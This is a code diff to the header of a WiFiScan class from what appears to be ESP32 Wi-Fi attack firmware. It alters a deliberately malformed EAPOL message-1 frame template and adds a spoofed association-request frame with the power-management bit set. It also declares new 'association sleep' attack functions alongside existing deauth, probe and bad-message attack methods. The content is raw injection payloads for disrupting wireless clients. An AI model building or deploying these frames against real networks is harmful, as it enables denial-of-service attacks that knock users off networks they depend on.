@@ -397,7 +397,7 @@ class WiFiScan
                               0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
-                              0x00, 0x00,                         // Sequence Control
+                              0x30, 0x00,                         // Sequence Control
                               /* LLC / SNAP */
                               0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00,
                               0x88, 0x8e,                          // Ethertype = EAPOL
@@ -429,11 +429,24 @@ class WiFiScan
                               /* Key Data Len (2) */ 
                               0x00, 0x16,
                               /* Key Data (22 B) */
-                              0xDD, 0x16,                // Vendor‑specific (PMKID IE)
+                              0xDD, 0x14,                // Vendor‑specific (PMKID IE)
                               0x00, 0x0F, 0xAC, 0x04,      // OUI + Type (PMKID)
                               /* PMKID (16 byte zero) */
-                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
-                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+                              0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 
+                              0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x11
+                          };
+
+    uint8_t association_packet[200] = {
+                              0x00, 0x10, // Frame Control (Association Request) PM=1
+                              0x3a, 0x01, // Duration
+                              0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
+                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
+                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+                              0x00, 0x00,                         // Sequence Control
+                              0x31, 0x00,                         // Capability Information (PM=1)
+                              0x0a, 0x00,                         // Listen Interval
+                              0x00,                               // SSID tag
+                              0x00,                               // SSID length      
                           };
 
     enum EBLEPayloadType
@@ -506,10 +519,13 @@ class WiFiScan
     void sendProbeAttack(uint32_t currentTime);
     void sendDeauthAttack(uint32_t currentTime, String dst_mac_str = "ff:ff:ff:ff:ff:ff");
     void sendBadMsgAttack(uint32_t currentTime, bool all = false);
+    void sendAssocSleepAttack(uint32_t currentTime, bool all = false);
     void sendDeauthFrame(uint8_t bssid[6], int channel, String dst_mac_str = "ff:ff:ff:ff:ff:ff");
     void sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]);
     void sendEapolBagMsg1(uint8_t bssid[6], int channel, String dst_mac_str = "ff:ff:ff:ff:ff:ff", uint8_t sec = WIFI_SECURITY_WPA2);
     void sendEapolBagMsg1(uint8_t bssid[6], int channel, uint8_t mac[6], uint8_t sec = WIFI_SECURITY_WPA2);
+    void sendAssociationSleep(const char* ESSID, uint8_t bssid[6], int channel, uint8_t mac[6]);
+    void sendAssociationSleep(const char* ESSID, uint8_t bssid[6], int channel, String dst_mac_str = "ff:ff:ff:ff:ff:ff");
     void broadcastRandomSSID(uint32_t currentTime);
     void broadcastCustomBeacon(uint32_t current_time, ssid custom_ssid);
     void broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_ssid);
